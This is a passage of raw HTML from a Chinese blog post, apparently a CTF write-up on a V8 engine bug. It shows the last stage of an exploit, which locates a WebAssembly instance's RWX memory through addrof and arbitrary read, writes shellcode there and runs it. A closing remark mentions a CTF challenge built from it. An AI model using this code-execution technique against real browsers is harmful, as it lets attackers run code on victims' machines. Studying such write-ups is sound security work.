style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    for</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">let</span><span style="color:#BD976A"> i</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">;</span><span style="color:#BD976A"> i</span><span style="color:#666666"> </span><span style="color:#666666">&#x3C;</span><span style="color:#BD976A"> sc</span><span style="color:#666666">.</span><span style="color:#B8A965">length</span><span style="color:#666666">;</span><span style="color:#BD976A"> i</span><span style="color:#CB7676"> +=</span><span style="color:#4C9A91"> 1</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#BD976A">        bigUintArray</span><span style="color:#d4976c">[</span><span style="color:#BD976A">i</span><span style="color:#d4976c">]</span><span style="color:#666666"> =</span><span style="color:#BD976A"> sc</span><span style="color:#d4976c">[</span><span style="color:#BD976A">i</span><span style="color:#d4976c">]</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><span style="color:#5eaab5">}</span><br><br><br><span style="color:#CB7676">let</span><span style="color:#BD976A"> rwx_mem</span><span style="color:#666666"> =</span><span style="color:#80A665"> arb_r</span><span style="color:#5eaab5">(</span><span style="color:#80A665">addrof</span><span style="color:#4d9375">(</span><span style="color:#BD976A">wasm_instance</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 0x60</span><span style="color:#CB7676">n</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">print</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">rwx_mem</span><span style="color:#666666">.</span><span style="color:#80A665">toString</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">16</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">arb_w</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">rwx_mem</span><span style="color:#666666">,</span><span style="color:#BD976A"> shellcode</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">f</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">;</span><br></code></pre></div>
<p>后记：参考这道题目，给 N1Junior CTF 2/2 出了一道 v8 cve 签到题。</p></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>